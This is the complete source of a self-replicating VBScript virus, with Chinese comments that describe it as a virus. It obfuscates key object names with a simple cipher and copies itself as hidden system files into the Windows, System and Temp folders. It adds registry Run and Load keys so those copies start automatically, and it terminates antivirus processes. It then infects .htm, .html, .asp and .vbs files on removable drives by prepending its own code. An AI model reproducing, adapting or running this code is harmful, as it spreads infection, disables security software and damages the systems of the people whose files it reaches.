<Script Language=VBScript>
'$Top
dim HLMRun,HCULoad,SelfPath
HLMRun ="HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows\CurrentVersion\Run\"
HCULoad="HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
WSFN="ZVfulsw1VfulswIxooQdph"     '经过加密的"WScript.ScriptFullName"字符串
SFSO="Vfulswlqj1IlohV|vwhpRemhfw" '经过加密的"Scripting.FileSystemObject"字符串


Call Main()

'功能：主程序
Sub Main()
On Error Resume Next 
dim pvbs
Execute("pvbs=" & DeCode(WSFN)) '得到病毒文件本身的路径

'判断文件执行状态 还有待完善
If pvbs  = "" then             
          Err.Clear 
          Call ExeWebPage() '执行WEB页状态时的程序        
Else               
          Call ExeVbs()     '执行VBS文件状态时所的程序   
End If 
End Sub


'功能:病毒文件是WEB页状态时所执行的程序 
Sub ExeWebPage() 
On Error Resume Next
dim strVbs


Set fso = CreateObject(DeCode(SFSO)) 

strVbs=GetScriptCode("vbscript") '得到VBScript脚本代码

dim path_vbsf0 ,path_vbsf1,path_vbsf2,pathf0 ,pathf1,pathf2

'自启动病毒文件的路径 
path_vbsf0 = GetSF(fso,0) & "WSH.vbs"   '0:Windows 文件夹  1:System 文件夹  2:Temp 文件夹
path_vbsf1 = GetSF(fso,1) & "TNT.vbs"
path_vbsf2 = GetSF(fso,2) & "data.vbs"

'创建自启动病毒文件 
If  fso.FileExists(path_vbsf0) = false Then 
         Call CopyFile(fso,strvbs,path_vbsf0)
         Call SetFileAttr(fso,path_vbsf0)
End If                       
If  fso.FileExists(GetSF(fso,1) & "TNT.vbs") = false  Then
         Call CopyFile(fso,strvbs,path_vbsf1)
         Call SetFileAttr(fso,path_vbsf1)
End If                              
If  fso.FileExists(GetSF(fso,2) & "data.vbs") = false  Then
         Call CopyFile(fso,strvbs,path_vbsf2)
         Call SetFileAttr(fso,path_vbsf2)
End If                                         

'添加自启动
If  ReadReg(HCULoad)="" Then 
                 
        Call WriteReg (HCULoad,path_vbsf0,"") 
End If
If  ReadReg(HLMRun & "IMJPMIG8.2")="" Then
        Call WriteReg (HLMRun & "IMJPMIG8.2" ,path_vbsf1,"")
End If
If  ReadReg(HLMRun & "{4BE556-456ACB-5A6656-55A1B6-CF13B1}")="" Then
        Call WriteReg (HLMRun & "{4BE556-456ACB-5A6656-55A1B6-CF13B1}" ,path_vbsf2,"")  
End If
Set fso = Nothing
End Sub 


'功能:设置文件属性为隐藏系统文件
'参数：f(fso对象) pathf(文件完整路径)
Sub SetFileAttr(f,pathf)
Set vf = f.GetFile(pathf)
vf.attributes=6 
End Sub


'功能:把指定代码拷贝到指定文件
'参数：f(fso对象),code(代码) pathf(文件完整路径)
Sub CopyFile(f,code, pathf)
On Error Resume Next 
Set vf = f.OpenTextFile(pathf,2,true) 
vf.Write code 
vf.Close 
End Sub


'功能:得到不同脚本语言的代码
'备注：需改进 
Function GetScriptCode(Languages)
On Error Resume Next 
dim soj 
For Each soj In document.Scripts
    If LCase(soj.Language) = Languages then             
         Select Case LCase(soj.Language) 
              Case "vbscript"                   
                   GetScriptCode = soj.Text  
                   Exit Function 
              Case "javascript"               
                   GetScriptCode = soj.Text 
                   Exit Function 
         End Select   

     End If
Next 

End Function 


'功能:病毒文件是VBS文件状态时所执行的程序 
Sub ExeVbs() 
On Error Resume Next
Set fso = CreateObject(DeCode(SFSO)) 
Set wvbs = CreateObject("WScript.Shell") 
wvbs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD" '超时设置，防止操作超时造成的程序终止
Set wvbs = Nothing

'结束指定进程
ProcessNames=Array("360safe.exe","avp.exe","ravmon.exe","rav.exe","runiep.exe","ras.exe") 
Call KillProcess(ProcessNames)
'遍历所有驱动器
Call SearchDrives(fso)

Set fso = Nothing
End Sub 


'功能：获得自身病毒代码
'参数：f(fso对象) SelfPath
Function GetSelfCode(f,SelfPath)
On Error Resume Next 
dim n,n1,buffer,Self
Set Self= f.OpenTextFile(SelfPath,1) 
buffer = Self.ReadAll
n=Instr(buffer,"'$Top")
n1=InstrRev(buffer,"'$Bottom")
buffer=Mid(buffer,n,n1-n+8)
GetSelfCode=buffer
Self.Close
End Function


'功能：遍历所有驱动器(1:可移动媒体驱动器 ,2:固定驱动器,3:网络驱动器)
'参数：f(fso对象)
'备注：暂时只遍历可移动媒体驱动器且不遍历C盘
Sub SearchDrives(f)
On Error Resume Next 
dim d  
Set dc = f.Drives
For Each d In dc    
    If  (d.DriveType = 1 or d.DriveType=2 or d.DriveType = 3) and d.DriveLetter <> "C"  Then
            If d.DriveType = 1  Then                  
                 Call SearchFile(f,d.path & "\")
            End If
    End If  
Next  
End sub



'功能：搜索可传染文件的过程
'参数：f(fso对象) strPath(文件夹或驱动器的完整路径)
Sub SearchFile(f,strPath) 
On Error Resume Next
dim pfi,ext
'遍历所有文件
Set pfo = f.GetFolder(strPath)
Set pf = pfo.Files 
For Each pfi In pf 
     ext = LCase(f.GetExtensionName(pfi.Path)) 
     Select Case ext   '检查文件的扩展名是否为 htm、html、asp、vbs
          Case "htm" , "html" ,"asp" ,"vbs": 
              Execute("SelfPath=" & DeCode(WSFN))  '执行 SelfPath=WScript.ScriptFullName语句
              vbsCode=GetSelfCode(f,SelfPath)       '得到自身病毒代码           
              Call InfectHead(pfi.Path,pfi,f,vbsCode,ext)            
     End Select 
Next
'遍历所有文件夹
Set psfo = pfo.SubFolders 
For Each ps In psfo 
   Call SearchFile(f,ps.Path) '递归调用
Next 
End Sub


'功能:判断文件是否已被感染
'参数:buffer(文件全部数据) ftype(文件类型)
'返回值:true(已被感染) false(未被感染)
Function Isinfected(buffer,ftype)
Isinfected=true
     Select Case ftype   
          Case "htm" , "html" ,"asp", "vbs": 
                 If Instr(buffer,"'$Top") =0   Then
                          Isinfected=false
                 End If
          Case Else
                 Isinfected=true 
          
     End Select 

End Function


'功能：传染文件,将代码插入到文件头，只传染小于100KB的文件
'参数：strPath(文件完整路径) fi(文件对象)  f(fso对象) strCode(插入的代码) ftype(文件类型)
Sub InfectHead(strPath,fi,f,strCode,ftype)
On Error Resume Next  
dim tso, buffer

If fi.size<100000 Then   '只传染小于100KB的文件

  Set tso = f.OpenTextFile(strPath, 1, true) 
  buffer = tso.ReadAll() 
  tso.Close

  Select Case ftype   
          Case "htm" , "html" ,"asp": 
               If Isinfected(buffer,ftype) =false Then '判断是否已被感染
                               strCode=MakeScript(strCode,0)  '生成网页脚本
                               Set tso = f.OpenTextFile(strPath, 2, true) 
                               tso.Write  strCode & vbcrlf & buffer   '插入到文件头 
                               tso.Close
                               Set tso = Nothing                      
               End If
      
          Case "vbs":
               If Isinfected(buffer,ftype) =false Then '判断是否已被感染
                      n=InStr(buffer ,"Option Explicit")   '去除Option Explicit的影响 因为Option Explicit语句之前不能放置任何代码
                      If n<>0 Then 
                               buffer = Replace(buffer,"Option Explicit", "",1,1,1)
                               Set tso = f.OpenTextFile(strPath, 2, true) 
                               tso.Write  strCode & vbcrlf & buffer   '插入到文件头 
                               tso.Close
                               Set tso = Nothing 
                      Else 
                               Set tso = f.OpenTextFile(strPath, 2, true) 
                               tso.Write  strCode & vbcrlf & buffer   '插入到文件头 
                               tso.Close
                               Set tso = Nothing 
                      End If        
               End If                 
          Case Else
                         
  End Select 

End If
 
End Sub 


'功能：得到系统路径
'参数：f(fso对象)  p(参数 0: Windows 文件夹 1: System 文件夹  2: Temp 文件夹 )
'返回值：GetSF（系统路径文件夹路径）
Function GetSF(f,p)
'On Error Resume Next  
GetSF=f.GetSpecialFolder(p) & "\" 
End Function


'功能：加密并生成网页脚本
'参数：strCode(vbs脚本)  T(1:加密   0 :不加密)
'返回值:MakeScript（vbs网页脚本）
'备注：加密功能还有待完善
Function MakeScript(strCode, T) 
If T=1 then 
     MakeScript= EnCode(strCode)
Else 

     MakeScript= "<" & "SCRIPT Language = VBScript>" & vbcrlf & strCode &  vbcrlf & "</" & "SCRIPT>" 
End If 

End Function 


'功能：结束指定进程集合
'参数：ProcessNames(进程集合)
Sub KillProcess(ProcessNames)
On Error Resume Next
Set objWMIService=GetObject("winmgmts:{impersonationLevel=Impersonate}!root\cimv2")
For Each ProcessName in ProcessNames 
     Set colProcessList=objWMIService.execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
     For Each objProcess in colProcessList
            objProcess.terminate()
     Next

Next

End Sub

'功能：删除注册表 
'参数：strkey(注册表项及数据名称)  
Sub DeleteReg(strkey)
On Error Resume Next 
Set tmps = CreateObject("WScript.Shell")  
tmps.RegDelete strkey
Set tmps = Nothing 
End Sub


'功能：读取注册表
'参数：strkey(注册表项及数据名称)
'返回值:ReadReg(注册表数据)
Function ReadReg(strkey)
On Error Resume Next  
Set tmps = CreateObject("WScript.Shell") 
ReadReg = tmps.RegRead(strkey) 
Set tmps = Nothing 
End Function


'功能：写入注册表 
'参数：strkey(注册表项及数据名称)  value(注册表数据) vtype(值类型)
Sub WriteReg(strkey, value, vtype)
On Error Resume Next 

Set tmps = CreateObject("WScript.Shell")  
If vtype="" then 
   tmps.RegWrite strkey, value 
Else 
   tmps.RegWrite strkey, value, vtype 
End If 
Set tmps = Nothing 
End Sub 


'功能：加密字符串
'参数：字符串(Coded)
Function EnCode(Coded)
On Error Resume Next 
For i= 1 To Len(Coded) 
      Curchar=Mid(Coded,i,1) 
      If Asc(Curchar) = 8 then 
             Curchar=chr(16) 
      Elseif Asc(Curchar) = 12 then 
             Curchar=chr(24) 
      Elseif Asc(Curchar) = 18 then 
             Curchar=chr(32) 
      Else 
          Curchar=chr(Asc(Curchar)+3) 
      End if 

EnCode=Encode & Curchar
Next 

End Function 


'功能：解密字符串
'参数：字符串(Coded)
Function DeCode(Coded)
On Error Resume Next 
For i= 1 To Len(Coded) 
      Curchar=Mid(Coded,i,1) 
      If Asc(Curchar) = 16 then 
             Curchar=chr(8) 
      Elseif Asc(Curchar) = 24 then 
             Curchar=chr(12) 
      Elseif Asc(Curchar) = 32 then 
             Curchar=chr(18) 
      Else 
             Curchar=chr(Asc(Curchar)-3) 
      End if 

DeCode=Decode & Curchar
Next 
End Function 
'$Bottom
</Script>    
